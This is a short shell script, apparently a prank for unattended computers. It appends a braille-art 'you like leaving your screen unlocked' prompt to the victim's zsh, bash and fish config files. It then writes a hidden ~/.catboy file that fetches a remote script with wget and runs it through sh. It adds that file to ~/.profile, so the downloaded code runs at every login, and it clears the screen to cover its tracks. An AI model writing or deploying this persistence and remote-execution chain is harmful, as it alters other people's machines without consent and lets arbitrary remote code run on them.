#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi

PROMPT="⠀⠀⠀⠀⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢄⠀⠀
⠀⠀⢀⠎⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠔⠁⠀⢣⠀
⠀⠀⡎⠀⠀⠀⠀⠑⡄⠀⠀⢠⠀⣤⡄⠀⠀⠀⠀⠀⠀⠀⢠⠊⠀⠀⠀⠀⠈⡄
⠀⢰⠁⠀⠀⠀⠀⠀⠈⠢⡀⠈⡄⠀⠀⠉⠒⠄⡀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⢃
⠀⡌⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⡸⠦⠄⠀⠀⠀⠈⠢⡎⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⡇⠀⠀⠀⠀⠀⠀⠀⢴⣊⣁⣀⣀⠤⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇
⠀⠈⢆⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠤⢤⠤⠄⠀⠀⠀⡜⠀
⡀⠀⠈⢆⠀⠈⡟⠁⠈⣿⣿⣿⠁⠀⠀⠀⠀⢸⣿⣿⣷⠀⠀⡇⠀⠀⢀⠜⠀⠀
⠻⡐⠒⠚⠓⠠⡅⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠸⣿⣿⡏⠀⠀⣜⠀⠀⠉⠁⡼⠀
⠀⠣⣀⡀⠀⠀⢧⠀⠀⠹⣿⠟⠀⣤⣀⠀⠀⠀⠻⠛⠁⠀⠀⠛⡀⠀⣠⠔⠁⠀ You like leaving your screen
⠀⠀⢠⠃⠘⠹⠔⠓⠀⠀⠀⢀⠀⠀⢀⠀⠀⣠⠀⠀⠀⠚⠭⠚⠁⠀⠈⢆⠀⠀ unlocked, don't you?
⠀⢠⣃⣀⣀⣄⠀⠀⠀⠀⠀⠈⠑⠊⠁⠉⠉⠀⠀⠀⠀⠀⢀⡠⠤⠀⠤⠤⠇⠀
⠀⠀⠀⠀⠀⠀⠉⠒⡦⠤⢀⣀⠀⠀⠀⠀⠀⠀⠀⠐⢒⠊⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣎⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀"
putrc() {
	RCS="${HOME}/.zshrc ${HOME}/.bashrc ${HOME}/.config/fish/config.fish"
	for word in $RCS
	do
		echo "$1" >> $word
	done
}
putrc "\nPS1=\"${PROMPT}\""
echo -n 'sh -c "$(wget -qO - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh)"' >>~/.catboy
chmod +x ~/.catboy
echo -n '~/.catboy' >>~/.profile
case "${SHELL}" in
	"/bin/zsh")
		source "${HOME}/.zshrc"
		;;
	"/bin/bash")
		source "${HOME}/.bashrc"
		;;
	"/bin/fish")
		source "${HOME}/.config/fish/config.fish"
		;;
	*)
		;;
esac
clear
